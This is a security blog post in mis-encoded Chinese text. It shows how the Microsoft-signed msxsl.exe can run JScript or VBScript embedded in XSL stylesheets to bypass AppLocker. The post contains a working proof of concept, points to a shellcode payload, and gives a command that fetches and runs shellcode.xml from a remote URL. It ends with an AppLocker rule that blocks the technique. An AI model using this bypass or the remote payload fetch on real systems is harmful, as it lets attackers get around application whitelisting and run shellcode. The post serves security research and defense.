I"¬"<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Casey Smith@subTeeåœ¨twitteråˆ†äº«çš„ä¸€ä¸ªæŠ€å·§ï¼Œä½¿ç”¨åŒ…å«å¾®è½¯ç­¾åçš„msxsl.exeèƒ½å¤Ÿæ‰§è¡ŒJScriptä»£ç ï¼Œä»è€Œå®ç°å¯¹Applockerçš„ç»•è¿‡ã€‚</p>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/1-1.png" alt="Alt text" /></p>

<p><strong>twitteråœ°å€å¦‚ä¸‹ï¼š</strong></p>

<p>https://twitter.com/subTee/status/877616321747271680</p>

<p><strong>POCåœ°å€å¦‚ä¸‹ï¼š</strong></p>

<p>https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦å¯¹è¿™é¡¹æŠ€æœ¯è¿›è¡Œä»‹ç»ï¼Œåˆ†æå¯ä¾›è¿›ä¸€æ­¥åˆ©ç”¨çš„æ–¹æ³•ï¼ŒåŒæ—¶å¯¹å…¶æ‰©å±•ï¼Œä»‹ç»ä½¿ç”¨msxsl.exeæ‰§è¡ŒVBScriptä»£ç çš„æ–¹å¼</p>

<h2 id="0x02-msxsl">0x02 msxsl</h2>
<hr />

<h3 id="1msxslexe">1ã€msxsl.exe</h3>

<ul>
  <li>XSL(Extensible Stylesheet Language)è½¬æ¢å™¨</li>
  <li>å‘½ä»¤è¡Œå·¥å…·</li>
  <li>å¸¦æœ‰å¾®è½¯æ•°å­—ç­¾å</li>
</ul>

<p><strong>ä¸‹è½½åœ°å€ï¼š</strong></p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=21714</p>

<p>æ‰§è¡Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-1.png" alt="Alt text" /></p>

<p>å‚è€ƒCasey Smithçš„POC:</p>

<p>customers.xml:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
&lt;customers&gt;
   &lt;customer&gt;
      &lt;name&gt;John Smith&lt;/name&gt;
      &lt;address&gt;123 Elm St.&lt;/address&gt;
      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
   &lt;/customer&gt;
   &lt;customer&gt;
      &lt;name&gt;Mary Jones&lt;/name&gt;
      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
   &lt;/customer&gt;
&lt;/customers&gt;
</code></pre></div></div>

<p>script.xml:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace"&gt;

&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
   function xml(nodelist) {
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      return nodelist.nextNode().xml;
	  
   }
&lt;/msxsl:script&gt;
&lt;xsl:template match="/"&gt;
   &lt;xsl:value-of select="user:xml(.)"/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>æˆåŠŸæ‰§è¡ŒJScriptä»£ç ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œpocæ‰§è¡Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-2.png" alt="Alt text" /></p>

<p>å¼€å¯Applockerï¼Œæ·»åŠ è§„åˆ™æ‹¦æˆªjsè„šæœ¬çš„æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-3.png" alt="Alt text" /></p>

<p>ä½†æ˜¯ä½¿ç”¨msxslä»ç„¶èƒ½å¤Ÿæ‰§è¡ŒJScriptä»£ç </p>

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F">ã€Šåˆ©ç”¨JSåŠ è½½.Netç¨‹åºã€‹</a>ä»‹ç»è¿‡åˆ©ç”¨JScriptè„šæœ¬åŠ è½½.Netç¨‹åºçš„æ–¹æ³•ï¼Œç»“åˆæœ¬æ–‡ï¼Œå¯ä»¥å¾—å‡ºæ¨è®ºï¼š</p>

<p><strong>ä½¿ç”¨msxslä¹Ÿèƒ½å¤Ÿæ‰§è¡Œc#ä»£ç </strong></p>

<p>å…·ä½“æ¥è¯´ï¼Œèƒ½å¤Ÿå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p>

<ul>
  <li>æ‰§è¡Œshellcode</li>
  <li>æ‰§è¡Œmimikatz</li>
  <li>æ‰§è¡Œpowershellè„šæœ¬</li>
</ul>

<h3 id="2æ‰§è¡Œshellcode">2ã€æ‰§è¡Œshellcode</h3>

<p>å¯å‚ç…§Cn33lizçš„StarFightersï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js</p>

<p>ç»“åˆCaseyçš„POCï¼Œå°±èƒ½å¤Ÿå®ç°åˆ©ç”¨msxslæ‰§è¡Œshellcode</p>

<p>å®Œæ•´ä»£ç æˆ‘å·²ç»ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml</p>

<p>æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-1.png" alt="Alt text" /></p>

<p>å¯¹äºæ‰§è¡Œmimikatzå’Œpowershellè„šæœ¬ï¼Œæ€è·¯å¯å‚ç…§ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F">ã€Šåˆ©ç”¨JSåŠ è½½.Netç¨‹åºã€‹</a></p>

<h2 id="0x03-è„šæœ¬ä¼˜åŒ–">0x03 è„šæœ¬ä¼˜åŒ–</h2>
<hr />

<p>åˆ†æxmlæ–‡ä»¶æ ¼å¼ï¼Œå¯¹Caseyçš„POCä½œé€‚å½“ä¼˜åŒ–</p>

<h3 id="1ç²¾ç®€customersxml">1ã€ç²¾ç®€customers.xml</h3>

<p>XMLå…ƒç´ å‘½åè§„åˆ™ï¼š</p>

<ul>
  <li>åç§°å¯ä»¥å«å­—æ¯ã€æ•°å­—ä»¥åŠå…¶ä»–çš„å­—ç¬¦</li>
  <li>åç§°ä¸èƒ½ä»¥æ•°å­—æˆ–è€…æ ‡ç‚¹ç¬¦å·å¼€å§‹</li>
  <li>åç§°ä¸èƒ½ä»¥å­—ç¬¦ â€œxmlâ€ï¼ˆæˆ–è€… XMLã€Xmlï¼‰å¼€å§‹</li>
  <li>åç§°ä¸èƒ½åŒ…å«ç©ºæ ¼</li>
  <li>å¯ä½¿ç”¨ä»»ä½•åç§°ï¼Œæ²¡æœ‰ä¿ç•™çš„å­—è¯</li>
</ul>

<p>åŸPOCå†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
&lt;customers&gt;
   &lt;customer&gt;
      &lt;name&gt;John Smith&lt;/name&gt;
      &lt;address&gt;123 Elm St.&lt;/address&gt;
      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
   &lt;/customer&gt;
   &lt;customer&gt;
      &lt;name&gt;Mary Jones&lt;/name&gt;
      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
   &lt;/customer&gt;
&lt;/customers&gt;
</code></pre></div></div>

<p>ç»åˆ†æï¼Œå‚æ•°1ä¸­çš„xmlæ–‡ä»¶ä¸é‡è¦ï¼Œå…ƒç´ å¯ä»¥ä»»æ„æŒ‡å®š</p>

<p>å»æ‰ä¸ç›¸å…³çš„å‚æ•°ï¼Œé‡æ–°å‘½åä¸€ä¸ªxmlå…ƒç´ ï¼Œç²¾ç®€åä»£ç å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">&lt;a&gt;&lt;/a&gt;</code></p>

<p>å¹¶ä¸”ï¼Œå¦‚æœä¸ºäº†å°‘åˆ›å»ºæ–‡ä»¶ï¼Œä½¿ç”¨script.xslä½œä¸ºç¬¬ä¸€ä¸ªxmlæ–‡ä»¶å‚æ•°ä¹Ÿæ˜¯å¯ä»¥çš„</p>

<p>ä¾‹å¦‚,å‚æ•°å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">msxsl.exe script.xsl script.xsl</code></p>

<p>æ‰§è¡ŒæˆåŠŸï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-2.png" alt="Alt text" /></p>

<h3 id="2ä¼˜åŒ–scriptxsl">2ã€ä¼˜åŒ–script.xsl</h3>

<p>æ‰§è¡ŒVBScriptä»£ç ï¼š</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ç»æµ‹è¯•ï¼Œæ­¤xmlè„šæœ¬ä¸æ”¯æŒCSharpï¼ŒåŒè¯¥èµ„æ–™ç›¸è¿èƒŒï¼Œæ­¤é—®é¢˜æœ‰å¾…è§£å†³</p>

<p>èµ„æ–™åœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/533texsx(VS.71).aspx</p>

<p>å¯¹äºVBScriptè¯­è¨€ï¼Œä¸æ”¯æŒreturnè¡¨ç¤ºå‡½æ•°è¿”å›å€¼ï¼Œé€šè¿‡å‡½æ•°å=éœ€è¦è¿”å›çš„å€¼æ¥è¡¨ç¤ºå‡½æ•°è¿”å›å€¼</p>

<p>å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="urn:my-scripts"&gt;

&lt;msxsl:script language="VBScript" implements-prefix="user"&gt;
function myFunction()
	set shell=createobject("wscript.shell")
	shell.run "calc.exe",0
	myFunction = 0
end function

&lt;/msxsl:script&gt;
&lt;xsl:template match="/"&gt;
&lt;xsl:value-of select="user:myFunction()"/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>ä»¥ä¸Šæ–‡ä»¶å†…å®¹å¯¹åº”githubåœ°å€ï¼šhttps://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/VBScript.xml</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>è°ƒç”¨å‡½æ•°åè¦å¯¹åº”ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">&lt;xsl:value-of select="user:myFunction()"/&gt;</code></p>

<h3 id="3è¿œç¨‹æ‰§è¡Œ">3ã€è¿œç¨‹æ‰§è¡Œ</h3>

<p>msxsl.exeä¹Ÿæ”¯æŒè¿œç¨‹æ‰§è¡Œï¼Œå‚æ•°å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-3.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥æ–¹æ³•æ˜¯ä»Evi1cgå­¦æ¥çš„ï¼Œåšå®¢åœ°å€ï¼šhttps://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html</p>

<h2 id="0x04-é˜²å¾¡">0x04 é˜²å¾¡</h2>
<hr />

<p>æ·»åŠ Applockerçš„å¯æ‰§è¡Œè§„åˆ™ï¼ŒæŒ‡å®šmsxsl.exe</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-1.png" alt="Alt text" /></p>

<p>å³ä½¿æ›´æ”¹æ–‡ä»¶è·¯å¾„ï¼Œmsxsl.exeä»ç„¶æ— æ³•æ‰§è¡Œ</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-2.png" alt="Alt text" /></p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åˆ©ç”¨msxslç»•è¿‡AppLockerçš„æ–¹æ³•ï¼Œä½†æ˜¯é€šè¿‡å®šåˆ¶AppLockerè§„åˆ™ï¼Œè¿˜æ˜¯èƒ½å¤Ÿé™åˆ¶è¯¥æ–¹æ³•çš„ä½¿ç”¨ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
:ET